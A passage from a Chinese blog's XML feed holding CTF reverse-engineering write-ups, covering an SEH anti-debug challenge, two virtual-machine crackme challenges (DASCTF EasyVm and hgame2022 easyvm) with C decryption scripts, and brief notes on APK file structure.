src="/2022/02/03/SEH%E5%8E%9F%E7%90%86%E5%92%8C%E4%BE%8B%E9%A2%98/1643864939414.png"></p><p>第一个框对应上上面那句代码，这里按/就会显示出来对应反编译过来的伪代码</p><p>下面两个框的都是没被识别的语句</p><p>在图中位置下断点进行动态调试，会报错</p><p><img src="/2022/02/03/SEH%E5%8E%9F%E7%90%86%E5%92%8C%E4%BE%8B%E9%A2%98/1643865333034.png"></p><p>因为除数不能为0，去看看汇编</p><p><img src="/2022/02/03/SEH%E5%8E%9F%E7%90%86%E5%92%8C%E4%BE%8B%E9%A2%98/1643865908164.png"></p><p>按；写下注释</p><p>开始动态调试</p><p><img src="/2022/02/03/SEH%E5%8E%9F%E7%90%86%E5%92%8C%E4%BE%8B%E9%A2%98/1643866006832.png"></p><p>选择yes，发现进入到这段未被反编译的语句</p><p><img src="/2022/02/03/SEH%E5%8E%9F%E7%90%86%E5%92%8C%E4%BE%8B%E9%A2%98/1643866024820.png"></p><p><img src="/2022/02/03/SEH%E5%8E%9F%E7%90%86%E5%92%8C%E4%BE%8B%E9%A2%98/1643866787250.png"></p><p>第二次执行到这一段代码，可以看到ecx寄存器的值不是0，不会触发异常</p><p><img src="/2022/02/03/SEH%E5%8E%9F%E7%90%86%E5%92%8C%E4%BE%8B%E9%A2%98/1643866890816.png"></p><p>发现没有执行异或，而是继续往下执行，这就是下一步进行的反汇编语句</p><p><img src="/2022/02/03/SEH%E5%8E%9F%E7%90%86%E5%92%8C%E4%BE%8B%E9%A2%98/1643866944920.png"></p><p>因此可以知道，当变量num的最高位为0的时候，会触发异常，这时候系统会交给SEH进行处理，即__try代码</p><p>__except会执行异常后代码</p><p><img src="/2022/02/03/SEH%E5%8E%9F%E7%90%86%E5%92%8C%E4%BE%8B%E9%A2%98/1643867671850.png"></p><p>按空格查看执行顺序</p><p><img src="/2022/02/03/SEH%E5%8E%9F%E7%90%86%E5%92%8C%E4%BE%8B%E9%A2%98/1643867149242.png"></p><p>会发现这样一段独立出来的汇编代码</p><p>所以就可以写脚本，因为是unsigned int，右移31位就能知道最高位了</p><p>脚本</p><pre class="language-c" data-language="c"><code class="language-c">#include &lt;stdio.h&gt;#include &lt;string.h&gt;int main(){    unsigned int tmp1, tmp2;    unsigned int num;    unsigned int init_num=0;    int Buf2[8] = { 0 };    unsigned int key[10] = { 1,2,3,4,5,6,7,8.9,0 };    Buf2[0] = 0x457E62CF;    Buf2[1] = 0x9537896C;    Buf2[2] = 0x1F7E7F72;    Buf2[3] = 0xF7A073D8;    Buf2[4] = 0x8E996868;    Buf2[5] = 0x40AFAF99;    Buf2[6] = 0xF990E34;    Buf2[7] = 0x196F4086;    for (int i = 0; i &lt; 32; i++)    {        init_num += 2654435761;        if ((init_num &gt;&gt;31) == 0)        {            init_num ^= 0x1234567;        }    }//0C78E4D05    for (int j = 0; j &lt; 8; j += 2)    {        tmp1 = Buf2[j], tmp2 = Buf2[j + 1];        num = init_num;        for (int i = 0; i &lt; 32; i++)        {            tmp2 -= (num + key[(num &gt;&gt; 11) &amp; 3]) ^ (tmp1 + ((16 * tmp1) ^ (tmp1 &gt;&gt; 5)));            if ((num&gt;&gt;31) == 0)            {                num ^= 0x01234567;            }            num -= 2654435761;            tmp1 -= (num + key[num &amp; 3]) ^ (tmp2 + ((16 * tmp2) ^ (tmp2 &gt;&gt; 5)));        }        Buf2[j] = tmp1;        Buf2[j + 1] = tmp2;    }    for (int i = 0; i &lt; 8; i++)    {        printf("%x\n", Buf2[i]);    }    printf("%s", Buf2);}</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> PE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C语言汇编2</title>
      <link href="/2022/02/02/C%E8%AF%AD%E8%A8%80%E6%B1%87%E7%BC%962/"/>
      <url>/2022/02/02/C%E8%AF%AD%E8%A8%80%E6%B1%87%E7%BC%962/</url>
      
        <content type="html"><![CDATA[<h1 id="指针"><a href="#指针" class="headerlink" title="指针"></a>指针</h1>]]></content>
      
      
      
        <tags>
            
            <tag> 汇编 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VM逆向</title>
      <link href="/2022/01/23/VM%E9%80%86%E5%90%91/"/>
      <url>/2022/01/23/VM%E9%80%86%E5%90%91/</url>
      
        <content type="html"><![CDATA[<h1 id="Dasctf——EasyVm"><a href="#Dasctf——EasyVm" class="headerlink" title="Dasctf——EasyVm"></a>Dasctf——EasyVm</h1><p>一开始有个花指令，是比较常见的永真跳转，先对call指令按u取消定义，将e8改为90，再重新弄成函数就可以了</p><p>先找到加密的函数</p><p><img src="/2022/01/23/VM%E9%80%86%E5%90%91/1642951424173.png"></p><p>点进去看看</p><p><img src="/2022/01/23/VM%E9%80%86%E5%90%91/1642951469199.png"></p><p>这里是base64变种，在最后加了一个异或操作，先把脚本写出来</p><pre class="language-c" data-language="c"><code class="language-c">#include&lt;stdio.h&gt;#include&lt;string.h&gt;char base64_table[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";int findIndex(char c, char b64_table[]){for (int i = 0; i &lt; 64; ++i){if (c == b64_table[i])return i;}}char* base64_decode(char code[], char str[], char b64_table[]){char memstr[200] = { 0 };memcpy(memstr, code, strlen(code));int len = strlen(code);/*while (code[len] != '!' &amp;&amp; code[len] != 0){len++;}*/for (int i = 0, i_ = 0; i &lt; len; i += 4, i_ += 3){str[i_] = (findIndex(memstr[i]^0xa, b64_table) &lt;&lt; 2) | (findIndex(memstr[i + 1]^0xb, b64_table) &amp; 0x30) &gt;&gt; 4;str[i_ + 1] = (findIndex(memstr[i + 1]^0xb, b64_table) &amp; 0xf) &lt;&lt; 4 | (findIndex(memstr[i + 2]^0xc, b64_table) &amp; 0x3c) &gt;&gt; 2;str[i_ + 2] = (findIndex(memstr[i + 2]^0xc, b64_table) &amp; 0x03) &lt;&lt; 6 | (findIndex(memstr[i + 3]^0xd, b64_table));}int str_len = (len / 4) * 3 + len % 4;if (len % 4){str_len -= 1;}str[str_len] = 0;return str;}int main(){char code[100] = "";char decode[] = { 0 };base64_decode(code, decode, base64_table);printf("%s", decode);return 0;}</code></pre><p>接下来就是vm的部分</p><p><img src="/2022/01/23/VM%E9%80%86%E5%90%91/1642951694407.png"></p><p>先看func函数的类型，是指针数组</p><p>这里需要结合动调看每条指令对应的操作</p><p><img src="/2022/01/23/VM%E9%80%86%E5%90%91/1642953729321.png"></p><p>在这里下断点之后F7进入函数</p><p><img src="/2022/01/23/VM%E9%80%86%E5%90%91/1642953871966.png"></p><p><img src="/2022/01/23/VM%E9%80%86%E5%90%91/1642955403773.png"></p><p>这就是func数组存放的东西，因为是指针，所以要先按d转为dd才会显示</p><p><img src="/2022/01/23/VM%E9%80%86%E5%90%91/1642955602049.png"></p><p>先把指令提取出来</p><pre class="language-c" data-language="c"><code class="language-c">unsigned char ida_chars[] ={  0xCA, 0x00, 0x00, 0x00, 0x00, 0xCB, 0x00, 0x00, 0x00, 0x00,  0xCC, 0xCF, 0xC9, 0xEE, 0x00, 0x00, 0x00, 0xCF, 0xD1, 0xD3,  0x01, 0xFE, 0xC2, 0xD2, 0x39, 0x00, 0x00, 0x00, 0xD4, 0xEC,  0xFF, 0x00};</code></pre><p>F8单步调试</p><p>0xCA</p><p><img src="/2022/01/23/VM%E9%80%86%E5%90%91/1642955631076.png"></p><p>0xCB</p><p><img src="/2022/01/23/VM%E9%80%86%E5%90%91/1642955978948.png"></p><p>0xCC</p><p><img src="/2022/01/23/VM%E9%80%86%E5%90%91/1642955994447.png"></p><p>0xCF</p><p><img src="/2022/01/23/VM%E9%80%86%E5%90%91/1642956392630.png"></p><p>每执行完再进入func[2]都能知道当前位置，便于查看指令</p><p><img src="/2022/01/23/VM%E9%80%86%E5%90%91/1642956568041.png"></p><p>0xc9</p><p><img src="/2022/01/23/VM%E9%80%86%E5%90%91/1642956806744.png"></p><p><img src="/2022/01/23/VM%E9%80%86%E5%90%91/1642957130761.png"></p><p>0xd1</p><p><img src="/2022/01/23/VM%E9%80%86%E5%90%91/1642957467393.png"></p><p><img src="/2022/01/23/VM%E9%80%86%E5%90%91/1642957487310.png"></p><p>这里本来赋值为0，1，2，为了保持字符相等的情况，把 this[5]全部赋值为1</p><p><img src="/2022/01/23/VM%E9%80%86%E5%90%91/1642987459030.png"></p><p>0xd3</p><p><img src="/2022/01/23/VM%E9%80%86%E5%90%91/1642988305784.png"></p><p><img src="/2022/01/23/VM%E9%80%86%E5%90%91/1642988338522.png"></p><p>0xc2</p><p><img src="/2022/01/23/VM%E9%80%86%E5%90%91/1642988366450.png"></p><p>0xd2</p><p><img src="/2022/01/23/VM%E9%80%86%E5%90%91/1642988655617.png"></p><p>长度判断</p><p>0xd4</p><p><img src="/2022/01/23/VM%E9%80%86%E5%90%91/1642988824766.png"></p><p>0xcc</p><p>接下来又回到0xcc，所以就能猜测是循环做了异或操作，然后判断</p><p><img src="/2022/01/23/VM%E9%80%86%E5%90%91/1642989162099.png"></p><table><thead><tr><th>func[1]</th><th>指令集</th></tr></thead><tbody><tr><td>func[2]</td><td>加密后的flag的字符</td></tr><tr><td>func[3]</td><td>0</td></tr><tr><td>func[4]</td><td>索引</td></tr><tr><td>func[5]</td><td>判断字符相等</td></tr><tr><td>func[6]</td><td>对比的flag</td></tr><tr><td>func[7]</td><td>0</td></tr><tr><td>func[8]</td><td>加密后的字符串</td></tr><tr><td></td><td></td></tr><tr><td></td><td></td></tr><tr><td>0xca</td><td>先将this[1]指令后的数据存放到this[3]，然后往后跳转5，正好对应了下一条指令,一开始this[1]后一个数据为0，要先转为 dword</td></tr><tr><td></td><td></td></tr><tr><td>0xcb</td><td>先将this[1]指令后的数据存放到this[4]，然后往后跳转5，这也是下一条指令</td></tr><tr><td></td><td></td></tr><tr><td>0xcc</td><td>把this[2]先赋值为this[8]+this[4]，这里this[4]是个整数，所以猜测this[4]是索引，然后继续执行下一指令</td></tr><tr><td></td><td></td></tr><tr><td>0xcf</td><td>将this[3]和this[2]的值异或后存放在this[3],进入下一条指令</td></tr><tr><td></td><td></td></tr><tr><td>0xc9</td><td>先把this[1]下一个数据赋值给this[2],进入下一条指令，也就是0xee</td></tr><tr><td></td><td></td></tr><tr><td>0xcf</td><td>将this[3]和this[2]的值异或后存放在this[3],进入下一条指令</td></tr><tr><td></td><td></td></tr><tr><td>0xd1</td><td>根据this[4]的索引来进行字符比较，这里是调试过程，所以为了进行下一步，需要修改汇编指令</td></tr><tr><td></td><td></td></tr><tr><td>0xd3</td><td>v1是指针，解引用是v1下一个位置，也就是0x1，整个就是0xee，这时候然后指向下三个位置，也就是c2指令</td></tr><tr><td></td><td></td></tr><tr><td>0xc2</td><td>索引this[4]+1</td></tr><tr><td></td><td></td></tr><tr><td>0xd2</td><td>this[4]是索引，所以是判断是否结束，这里没结束，所以this[5]赋值为0</td></tr><tr><td></td><td></td></tr><tr><td>0xd4</td><td>ec+2==ee</td></tr></tbody></table><p>整个过程就是这样</p><p><img src="/2022/01/23/VM%E9%80%86%E5%90%91/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220124125427.jpg"></p><p>因为偶数次的异或等于不变，所以只需对奇数次的进行异或即可</p><p>最终脚本</p><pre class="language-c" data-language="c"><code class="language-c">#include&lt;stdio.h&gt;#include&lt;string.h&gt;char base64_table[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";int findIndex(char c, char b64_table[]){for (int i = 0; i &lt; 64; ++i){if (c == b64_table[i])return i;}}char* base64_decode(char code[], char str[], char b64_table[]){char memstr[200] = { 0 };memcpy(memstr, code, strlen(code));int len = strlen(code);/*while (code[len] != '!' &amp;&amp; code[len] != 0){len++;}*/for (int i = 0, i_ = 0; i &lt; len; i += 4, i_ += 3){str[i_] = (findIndex(memstr[i], b64_table) &lt;&lt; 2) | (findIndex(memstr[i + 1], b64_table) &amp; 0x30) &gt;&gt; 4;str[i_ + 1] = (findIndex(memstr[i + 1], b64_table) &amp; 0xf) &lt;&lt; 4 | (findIndex(memstr[i + 2], b64_table) &amp; 0x3c) &gt;&gt; 2;str[i_ + 2] = (findIndex(memstr[i + 2], b64_table) &amp; 0x03) &lt;&lt; 6 | (findIndex(memstr[i + 3], b64_table));}int str_len = (len / 4) * 3 + len % 4;if (len % 4){str_len -= 1;}str[str_len] = 0;return str;}int main(){char s[] ={  190,  54, 172,  39, 153,  79, 222,  68, 238,  95,  218,  11, 181,  23, 184, 104, 194,  78, 156,  74,  225,  67, 240,  34, 138,  59, 136,  91, 229,  84,  255, 104, 213, 103, 212,   6, 173,  11, 216,  80,  249,  88, 224, 111, 197,  74, 253,  47, 132,  54,  133,  82, 251, 115, 215,  13,0};char s2[] = { 0 };for (int i = 0; i &lt; 56; i+=2){s[i] ^= 0xee;}for (int i = 0; i &lt; 56; ++i){s2[i] = s[i];for (int k = i; k &gt; 0; k--){s2[i] ^= (s2[k - 1]);//该字符前面的全部都要异或上}}//printf("%s", s2);for (int i = 0; i &lt; 56; i = i + 4){s2[i] ^= 0xA;s2[i + 1] ^= 0xB;s2[i + 2] ^= 0xC;s2[i + 3] ^= 0xD;}char decode[] = { 0 };base64_decode(s2, decode, base64_table);printf("%s", decode);return 0;}</code></pre><h1 id="hgame2022-week4-easyvm"><a href="#hgame2022-week4-easyvm" class="headerlink" title="hgame2022-week4-easyvm"></a>hgame2022-week4-easyvm</h1><p>第一次尝试写解释器，跟着别人的大致思路的</p><p>首先VM就是模仿汇编，用指令代替汇编，用数据段来模拟寄存器和数据段，所以我们关键是要找到数据段和操作数、opcode，以及一些数据存放内容的含义</p><p>先来给寄存器重新命名</p><p><img src="/2022/01/23/VM%E9%80%86%E5%90%91/1645447619996.png"></p><p>根据main函数中switch可以找到类寄存器的位置，重命名</p><p><img src="/2022/01/23/VM%E9%80%86%E5%90%91/1645447726404.png"></p><p>从switch的v3可以知道，前面给v3赋值的就是操作数</p><p>r0[0]开始是0，所以操作指令第一个存储的位置是r0[109]，因为是int型，计算的时候×4，就可以找到地址</p><p><img src="/2022/01/23/VM%E9%80%86%E5%90%91/1645447904556.png"></p><p>按g跳转，使用lazyida dump下来</p><p><img src="/2022/01/23/VM%E9%80%86%E5%90%91/1645447995063.png"></p><p>接下来动调分析每条指令对应的汇编代码</p><p><img src="/2022/01/23/VM%E9%80%86%E5%90%91/1645448145669.png"></p><p>先++，再赋值给它，就相当于push指令的入栈操作，然后还有一个r4后移一位</p><table><thead><tr><th>push</th><th>data[r4++]</th></tr></thead><tbody><tr><td></td><td></td></tr></tbody></table><p><img src="/2022/01/23/VM%E9%80%86%E5%90%91/1645448615771.png"></p><p>先–，再赋值给r5，相当于pop操作</p><table><thead><tr><th>pop</th><th>r5</th></tr></thead><tbody><tr><td></td><td></td></tr></tbody></table><p><img src="/2022/01/23/VM%E9%80%86%E5%90%91/1645448764344.png"></p><p>又回到0x12，还是push，但是因为r4++，所以已经后移，我们根据计算也可以找到存储数据的地址并提取出数据</p><p><img src="/2022/01/23/VM%E9%80%86%E5%90%91/1645448880740.png"></p><p>回到汇编，这里的指令push了-5进入到堆栈，也就是寄存器下面的位置</p><table><thead><tr><th>push</th><th>data[r4++]</th></tr></thead><tbody><tr><td></td><td></td></tr></tbody></table><p><img src="/2022/01/23/VM%E9%80%86%E5%90%91/1645449458278.png"></p><table><thead><tr><th>pop</th><th>r6</th></tr></thead><tbody><tr><td></td><td></td></tr></tbody></table><p><img src="/2022/01/23/VM%E9%80%86%E5%90%91/1645449560687.png"></p><p>获取输入，并存储到a1中，这里的a1对应r3</p><table><thead><tr><th>getchar</th><th>r3</th></tr></thead><tbody><tr><td></td><td></td></tr></tbody></table><p><img src="/2022/01/23/VM%E9%80%86%E5%90%91/1645449886162.png"></p><p>熟悉的操作，把输入压入堆栈，记得栈顶往低处移动</p><table><thead><tr><th>push</th><th>r3</th></tr></thead><tbody><tr><td></td><td></td></tr></tbody></table><p><img src="/2022/01/23/VM%E9%80%86%E5%90%91/1645450099792.png"></p><p>这里的a1是r2</p><table><thead><tr><th>add</th><th>r2,1</th></tr></thead><tbody><tr><td></td><td></td></tr></tbody></table><p><img src="/2022/01/23/VM%E9%80%86%E5%90%91/1645450235632.png"></p><table><thead><tr><th>cmp</th><th>r3,r5</th></tr></thead><tbody><tr><td></td><td></td></tr></tbody></table><p>根据前面的pop r5可以知道此时r5是0A，而我们的输入被存入了r3，也就是对我们的输入字符进行判断，那么r8应该就对应ZF标志位</p><p><img src="/2022/01/23/VM%E9%80%86%E5%90%91/1645513351201.png"></p><p>验证了上面的想法，这里的a1是r6，也就是-5，指令跳转回去，相当于进行循环，输入完成后会有一个换行符，getchar会吸收，这里也就是结束我们的循环</p><table><thead><tr><th>jnz</th><th>r0-5</th></tr></thead><tbody><tr><td></td><td></td></tr></tbody></table><p>直接在下一条指令下断点，F9运行</p><p><img src="/2022/01/23/VM%E9%80%86%E5%90%91/1645513742181.png"></p><p>这里的a1是r2，用于记录输入长度，因为最后有一个回车符，所以要–</p><table><thead><tr><th>r2–</th><th></th></tr></thead><tbody><tr><td></td><td></td></tr></tbody></table><p>根据前面就可以先对数组进行注释</p><p><img src="/2022/01/23/VM%E9%80%86%E5%90%91/1645514228495.png"></p><p>r4没写上去，是内存中存储的一段数据</p><p>继续往下走</p><p><img src="/2022/01/23/VM%E9%80%86%E5%90%91/1645514299405.png"></p><p>将内存段的下一个数据入栈，也就是0x20</p><table><thead><tr><th>push</th><th>data[r4++]</th></tr></thead><tbody><tr><td></td><td></td></tr></tbody></table><p><img src="/2022/01/23/VM%E9%80%86%E5%90%91/1645514469709.png"></p><table><thead><tr><th>pop</th><th>r5,这里懒得改了，可以点过去查看</th></tr></thead><tbody><tr><td></td><td></td></tr></tbody></table><p>接下来是0x12和0x9</p><table><thead><tr><th>push</th><th>data[r4++]</th></tr></thead><tbody><tr><td>pop</td><td>r6</td></tr></tbody></table><p><img src="/2022/01/23/VM%E9%80%86%E5%90%91/1645514666638.png"></p><p>把r2的值赋给r3</p><table><thead><tr><th>mov</th><th>r3,r2</th></tr></thead><tbody><tr><td></td><td></td></tr></tbody></table><p><img src="/2022/01/23/VM%E9%80%86%E5%90%91/1645514774277.png"></p><table><thead><tr><th>push</th><th>r3</th></tr></thead><tbody><tr><td></td><td></td></tr></tbody></table><p><img src="/2022/01/23/VM%E9%80%86%E5%90%91/1645514918356.png"></p><table><thead><tr><th>cmp</th><th>r3,r5</th></tr></thead><tbody><tr><td></td><td></td></tr></tbody></table><p>但是这次比较的是字符串的长度，也就是字符串长度是32</p><p><img src="/2022/01/23/VM%E9%80%86%E5%90%91/1645515061894.png"></p><table><thead><tr><th>jnz</th><th>r0+r6</th></tr></thead><tbody><tr><td></td><td></td></tr></tbody></table><p>这里r6存放的是2f，正好对应结束，所以这段就相当于exit</p><p>下面是0x12和0x09</p><table><thead><tr><th>push</th><th>data[r4++]</th></tr></thead><tbody><tr><td>pop</td><td>r6</td></tr></tbody></table><p>0x12和0x0A</p><p>这是0x0a的代码</p><p><img src="/2022/01/23/VM%E9%80%86%E5%90%91/1645515342308.png"></p><table><thead><tr><th>push</th><th>data[r4++]</th></tr></thead><tbody><tr><td>pop</td><td>r2</td></tr></tbody></table><p>0x13</p><p><img src="/2022/01/23/VM%E9%80%86%E5%90%91/1645515472275.png"></p><p>r2此时为0，+9正好是堆栈的位置，也是存放我们输入数据的位置</p><table><thead><tr><th>mov</th><th>r3,stack[count]</th></tr></thead><tbody><tr><td></td><td></td></tr></tbody></table><p>从下面开始就是加密的部分了</p><p><img src="/2022/01/23/VM%E9%80%86%E5%90%91/1645515606892.png"></p><table><thead><tr><th>push</th><th>data[r4++]</th></tr></thead><tbody><tr><td></td><td></td></tr></tbody></table><p>0x0B</p><p><img src="/2022/01/23/VM%E9%80%86%E5%90%91/1645515758080.png"></p><table><thead><tr><th>pop</th><th>r7</th></tr></thead><tbody><tr><td></td><td></td></tr></tbody></table><p>0x15</p><p><img src="/2022/01/23/VM%E9%80%86%E5%90%91/1645515807493.png"></p><table><thead><tr><th>add</th><th>r3,r3</th></tr></thead><tbody><tr><td></td><td></td></tr></tbody></table><p>0x03</p><p><img src="/2022/01/23/VM%E9%80%86%E5%90%91/1645515866224.png"></p><table><thead><tr><th>xor</th><th>r3,r7</th></tr></thead><tbody><tr><td></td><td></td></tr></tbody></table><p><img src="/2022/01/23/VM%E9%80%86%E5%90%91/1645515954359.png"></p><p>把处理完的数据重新放入栈中</p><table><thead><tr><th>mov</th><th>stack[count],r3</th></tr></thead><tbody><tr><td></td><td></td></tr></tbody></table><p><img src="/2022/01/23/VM%E9%80%86%E5%90%91/1645516003430.png"></p><table><thead><tr><th>add</th><th>r2,1</th></tr></thead><tbody><tr><td></td><td></td></tr></tbody></table><p><img src="/2022/01/23/VM%E9%80%86%E5%90%91/1645516131712.png"></p><table><thead><tr><th>mov</th><th>r3,r2</th></tr></thead><tbody><tr><td></td><td></td></tr></tbody></table><p>0xF</p><p><img src="/2022/01/23/VM%E9%80%86%E5%90%91/1645516166189.png"></p><table><thead><tr><th>cmp</th><th>r3,r5</th></tr></thead><tbody><tr><td></td><td></td></tr></tbody></table><p><img src="/2022/01/23/VM%E9%80%86%E5%90%91/1645516207834.png"></p><table><thead><tr><th>jnz</th><th>r0+r6</th></tr></thead><tbody><tr><td></td><td></td></tr></tbody></table><p>此时的r6是-10，也就是跳转回到前十条指令，这就是循环加密，现在就差最终的密文了，前面加密的部分直接运行过去</p><p>再次来到0x12</p><p><img src="/2022/01/23/VM%E9%80%86%E5%90%91/1645516848887.png"></p><table><thead><tr><th>push</th><th>data[r4++]</th></tr></thead><tbody><tr><td></td><td></td></tr></tbody></table><p>0xA</p><table><thead><tr><th>pop</th><th>r2</th></tr></thead><tbody><tr><td></td><td></td></tr></tbody></table><p><img src="/2022/01/23/VM%E9%80%86%E5%90%91/1645517151788.png"></p><p>接下来是三个0x12</p><table><thead><tr><th>push</th><th>data[r4++]</th></tr></thead><tbody><tr><td>push</td><td>data[r4++]</td></tr><tr><td>push</td><td>data[r4++]</td></tr></tbody></table><p>到了0x08，此时我们的比较数据已经被压入栈中</p><p><img src="/2022/01/23/VM%E9%80%86%E5%90%91/1645517394177.png"></p><table><thead><tr><th>pop</th><th>r5</th></tr></thead><tbody><tr><td></td><td></td></tr></tbody></table><p>0x13，将处理完的值重新从堆栈中取出</p><table><thead><tr><th>mov</th><th>r3,satck[count]</th></tr></thead><tbody><tr><td></td><td></td></tr></tbody></table><p>0xF</p><table><thead><tr><th>cmp</th><th>r3,r5</th></tr></thead><tbody><tr><td></td><td></td></tr></tbody></table><p>0x07</p><p><img src="/2022/01/23/VM%E9%80%86%E5%90%91/1645517670674.png"></p><table><thead><tr><th>pop</th><th>r3</th></tr></thead><tbody><tr><td></td><td></td></tr></tbody></table><p>0x04</p><p><img src="/2022/01/23/VM%E9%80%86%E5%90%91/1645517727020.png"></p><table><thead><tr><th>mov</th><th>stack[count],r3</th></tr></thead><tbody><tr><td></td><td></td></tr></tbody></table><p>0x09</p><table><thead><tr><th>pop</th><th>r6</th></tr></thead><tbody><tr><td></td><td></td></tr></tbody></table><p>0x0D</p><p>r6是0x15，加上之后正好exit，和前面类似，压入栈是因为待会需要多次使用</p><table><thead><tr><th>jnz</th><th>r0+r6</th></tr></thead><tbody><tr><td></td><td></td></tr></tbody></table><p>这里没有问题就会往下</p><p>0x09</p><table><thead><tr><th>pop</th><th>r6</th></tr></thead><tbody><tr><td></td><td></td></tr></tbody></table><p>此时把-17给到r6</p><p>0x08</p><table><thead><tr><th>pop</th><th>r5</th></tr></thead><tbody><tr><td></td><td></td></tr></tbody></table><p>0x05</p><table><thead><tr><th>push</th><th>r5</th></tr></thead><tbody><tr><td></td><td></td></tr></tbody></table><p>0x06</p><table><thead><tr><th>push</th><th>r6</th></tr></thead><tbody><tr><td></td><td></td></tr></tbody></table><p>0x04</p><table><thead><tr><th>push</th><th>r3</th></tr></thead><tbody><tr><td></td><td></td></tr></tbody></table><p>0x01</p><table><thead><tr><th>add</th><th>r2,1</th></tr></thead><tbody><tr><td></td><td></td></tr></tbody></table><p>0x00</p><table><thead><tr><th>mov</th><th>r3,r2</th></tr></thead><tbody><tr><td></td><td></td></tr></tbody></table><p>0x0F//长度判断</p><table><thead><tr><th>cmp</th><th>r3,r5</th></tr></thead><tbody><tr><td></td><td></td></tr></tbody></table><p>0xd，重新进入循环</p><p><img src="/2022/01/23/VM%E9%80%86%E5%90%91/1645518636756.png"></p><h2 id="最终的一些数据和分组和脚本"><a href="#最终的一些数据和分组和脚本" class="headerlink" title="最终的一些数据和分组和脚本"></a>最终的一些数据和分组和脚本</h2><pre class="language-c" data-language="c"><code class="language-c">#include&lt;stdio.h&gt;#include&lt;string.h&gt;int main(){int opcode[65] = {    0x00000012, 0x00000008, 0x00000012, 0x00000009, 0x00000010, 0x00000004, 0x00000001, 0x0000000F, 0x0000000D, //接受我们的输入 0x00000002, 0x00000012, 0x00000008, 0x00000012, 0x00000009, 0x00000000, 0x00000004, 0x0000000F, 0x0000000D,//对flag进行存储操作，比较长度，因为getchar最后是32，所以flag长度为32 0x00000012, 0x00000009, 0x00000012, 0x0000000A, 0x00000013, 0x00000012, 0x0000000B, 0x00000015, 0x00000003, 0x00000014, 0x00000001, 0x00000000, 0x0000000F, 0x0000000D, //flag加密，flag[i]*2^3c存储的值     0x00000012, 0x0000000A, 0x00000012, 0x00000012, 0x00000012, 0x00000008, 0x00000013, 0x0000000F, 0x00000007, 0x00000004, 0x00000009, 0x0000000D, 0x00000009, 0x00000008, 0x00000005, 0x00000006, 0x00000004, 0x00000001, 0x00000000, 0x0000000F, 0x0000000D, //字符串比较 0x00000012, 0x00000009, 0x00000012,     0x00000008, 0x00000012, 0x0000000A, 0x00000012, 0x00000007, 0x0000000F, 0x0000000C, 0x00000011, //打印     0x0000000E};unsigned char xor_table[32]={0x5e,0x46,0x61,0x43,0x0e,0x53,0x49,0x1f,0x51,0x5e,0x36,0x37,0x29,0x41,0x63,0x3b,0x64,0x3b,0x15,0x18,0x5b,0x3e,0x22,0x50,0x46,0x5e,0x35,0x4e,0x43,0x23,0x60,0x3b};unsigned char enc[32]={0x8E, 0x88, 0xA3, 0x99, 0xC4, 0xA5, 0xC3, 0xDD,0x19, 0xEC, 0x6C, 0x9B, 0xF3, 0x1B, 0x8B, 0x5B,0x3E, 0x9B, 0xF1, 0x86, 0xF3, 0xF4, 0xA4, 0xF8,0xF8, 0x98, 0xAB, 0x86, 0x89, 0x61, 0x22, 0xC1};unsigned int data[83] = {//用于跳转和判断长度的数     0x0000000A, -5, 0x00000020, 0x0000002F, -10, 0x00000000,     //异或数据 0x0000005E, 0x00000046, 0x00000061, 0x00000043, 0x0000000E, 0x00000053, 0x00000049, 0x0000001F, 0x00000051, 0x0000005E, 0x00000036, 0x00000037, 0x00000029, 0x00000041, 0x00000063, 0x0000003B, 0x00000064, 0x0000003B, 0x00000015, 0x00000018, 0x0000005B, 0x0000003E, 0x00000022, 0x00000050, 0x00000046, 0x0000005E, 0x00000035, 0x0000004E, 0x00000043, 0x00000023, 0x00000060, 0x0000003B, //用于跳转，以及赋值初始索引 0x00000000, -17, 0x00000015, //密文 0x0000008E, 0x00000088, 0x000000A3, 0x00000099, 0x000000C4, 0x000000A5, 0x000000C3, 0x000000DD, 0x00000019, 0x000000EC, 0x0000006C, 0x0000009B, 0x000000F3, 0x0000001B, 0x0000008B, 0x0000005B, 0x0000003E, 0x0000009B, 0x000000F1, 0x00000086, 0x000000F3, 0x000000F4, 0x000000A4, 0x000000F8,0x000000F8, 0x00000098, 0x000000AB, 0x00000086, 0x00000089, 0x00000061, 0x00000022, 0x000000C1, 0x00000002, 0x00000000, -6, 0x00000073, 0x00000075, 0x00000063, 0x00000063,     0x00000065, 0x00000073, 0x00000073};char flag[32]={0};for(int i=0;i&lt;32;++i){enc[i]=(enc[i]^xor_table[i])/2;}printf("%s",enc);return 0;}</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安卓知识</title>
      <link href="/2022/01/22/%E5%AE%89%E5%8D%93%E7%9F%A5%E8%AF%86/"/>
      <url>/2022/01/22/%E5%AE%89%E5%8D%93%E7%9F%A5%E8%AF%86/</url>
      
        <content type="html"><![CDATA[<h1 id="APK基本结构"><a href="#APK基本结构" class="headerlink" title="APK基本结构"></a>APK基本结构</h1><p><a href="https://www.cnblogs.com/zhaijiahui/p/6916556.html">https://www.cnblogs.com/zhaijiahui/p/6916556.html</a></p><p>因为java语言没办法直接控制硬件，所以要使用C/C++来写代码，保存在so文件中 </p><p>反编译之后是smali代码，动态调试</p><p>assets：存放未编译的资源</p><p>lib：存放so文件，即本地代码</p><p>libs：第三方包</p><p>META-INF：存放签名</p><p>res：编译后的资源</p><p>AndroidManifest.xml：用于存放清单</p><p>.dex文件：反编译后为smali代码</p>]]></content>
      
      
      
        <tags>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C语言汇编</title>
      <link href="/2022/01/20/C%E8%AF%AD%E8%A8%80%E6%B1%87%E7%BC%96/"/>
      <url>/2022/01/20/C%E8%AF%AD%E8%A8%80%E6%B1%87%E7%BC%96/</url>
      
